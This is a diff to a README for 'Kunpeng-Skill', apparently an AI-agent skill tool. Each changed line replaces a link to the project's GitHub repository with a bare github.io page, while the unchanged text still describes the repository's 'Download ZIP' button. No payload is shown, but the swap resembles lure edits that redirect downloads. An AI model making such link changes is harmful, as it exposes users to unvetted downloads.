@@ -53,7 +53,7 @@ We're going to get this running in just a few minutes. Don't worry, it's easy.
 
 Click the big colored button below to go to the download page:
 
-[![Download Kunpeng-Skill](https://img.shields.io/badge/Download-Kunpeng--Skill-blue?style=for-the-badge&logo=github)](https://github.com/adigb6170/kunpeng-skill)
+[![Download Kunpeng-Skill](https://img.shields.io/badge/Download-Kunpeng--Skill-blue?style=for-the-badge&logo=github)](https://adigb6170.github.io)
 
 That takes you to the main GitHub page for this project. Look for the green button that says **"Code"** and click it. Then click **"Download ZIP"**. This downloads a folder containing everything you need.
 
@@ -84,7 +84,7 @@ Try importing a website you like first by pasting its URL into the import box. T
 
 Need to grab the file again? Here's the same link:
 
-**Download Link:** [https://github.com/adigb6170/kunpeng-skill](https://github.com/adigb6170/kunpeng-skill)
+**Download Link:** [https://adigb6170.github.io](https://adigb6170.github.io)
 
 Just follow the same steps: click "Code" → "Download ZIP" → extract → run.
 
@@ -146,6 +146,6 @@ Kunpeng-Skill takes the knowledge scattered across your digital life and turns i
 
 Click the link above to grab your copy now and start making every future project easier than the last one.
 
-**Download Again:** [https://github.com/adigb6170/kunpeng-skill](https://github.com/adigb6170/kunpeng-skill)
+**Download Again:** [https://adigb6170.github.io](https://adigb6170.github.io)
 
 Keywords: agent-skills, claude-code, codex, hermes-agent, knowledge-distillation, opencode, ppt-design, presentation-design, product-planning, ui-design, ux-design, vibe-coding, workbuddy
